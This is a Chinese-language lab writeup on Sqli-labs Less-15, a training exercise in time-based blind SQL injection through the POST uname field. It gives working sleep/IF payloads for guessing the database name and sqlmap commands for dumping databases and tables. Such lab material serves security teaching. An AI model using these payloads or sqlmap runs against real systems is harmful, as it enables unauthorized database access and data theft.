---
title: Sqli-labs Less-15 Writeup
date: 2026-11-19
categories: 渗透测试
tags: [Sqli-labs, SQL注入, Web, POST注入, 时间盲注]
---
## 一、 漏洞概述
- **关卡**：Less-15
- **漏洞类型**：基于时间延迟的 POST 型盲注（Time-Based Blind POST SQL Injection）
- **注入点**：登录表单的 `uname` 参数
- **闭合方式**：单引号 `'`

## 二、 渗透测试过程

### 1. 探测注入点与闭合方式
访问 Less-15 关卡，页面为一个登录表单。抓取 POST 请求。
尝试输入 `admin'`、`admin"`、`admin')` 等，页面均未发生任何变化，也没有提示“登录失败”。这说明后端不仅关闭了报错，甚至连“真/假”状态的差异也被屏蔽了。

为了验证漏洞是否存在，我们引入 `SLEEP()` 函数来测试**时间延迟**。
将拦截到的请求体修改为：
```text
uname=admin' AND sleep(5) #&passwd=123&submit=Submit
```

结果：放行请求后，页面加载卡顿约 5 秒才响应。这证明存在单引号 ' 闭合的 SQL 注入漏洞，且可利用时间盲注。

### 2. 确认时间盲注特征

由于无法通过页面内容判断逻辑的真假，必须使用 IF(condition, sleep(5), 1) 函数。如果条件成立，数据库会执行 sleep(5) 导致页面卡顿；如果不成立，则立即返回。

测试：

· 条件为真：
  ```text
  uname=admin' AND if(1=1, sleep(3), 1) #&passwd=123&submit=Submit
  ```
  （放行后页面明显卡顿 3 秒）
· 条件为假：
  ```text
  uname=admin' AND if(1=2, sleep(3), 1) #&passwd=123&submit=Submit
  ```
  （放行后页面秒响应）

由此确认存在基于时间的盲注漏洞。

### 3. 手工盲注猜解数据

构造条件语句，通过页面的响应延迟时间来逐字猜解数据库名：

· 判断数据库名长度：
  ```text
  uname=admin' AND if(length(database())=8, sleep(5), 1) #&passwd=123&submit=Submit
  ```
  （如果卡顿 5 秒，说明数据库名长度为 8）
· 猜解数据库名首字母（ASCII码）：
  ```text
  uname=admin' AND if(ascii(substr(database(),1,1))>100, sleep(5), 1) #&passwd=123&submit=Submit
  ```
  （如果卡顿，说明首字母 ASCII 码大于 100）

注：手工进行时间盲注效率极低且极易受网络波动干扰，实战中仅用于初步验证漏洞，后续数据提取必须交由工具自动化完成。

## 三、 自动化利用 (SQLMap)

针对 POST 型时间盲注，SQLMap 是最佳选择。将 Burp Suite 拦截到的请求保存为文件（例如 less15.txt）。

```bash
# 使用 -r 参数读取 HTTP 请求文件
# --technique T 指定使用时间盲注技术
# --time-sec=5 设置延迟时间（通常与 payload 中的 sleep 时间一致，或稍大）
sqlmap -r less15.txt --technique T --time-sec 5 --batch --current-db

# 若要获取 security 库下的表名：
sqlmap -r less15.txt --technique T --time-sec 5 --batch -D security --tables
```

(提示：在使用 SQLMap 跑时间盲注时，可以加上 -v 3 查看具体的注入 payload，方便学习其自动构造逻辑。)

## 四、 通关 Payload 汇总

测试目的 Payload (仅限 uname 字段) 页面响应状态
测试延时 admin' AND sleep(5) # 卡顿约 5 秒
条件为真 admin' AND if(1=1, sleep(3), 1) # 卡顿约 3 秒
条件为假 admin' AND if(1=2, sleep(3), 1) # 秒响应
猜解长度 admin' AND if(length(database())=8, sleep(3), 1) # 条件成立则卡顿
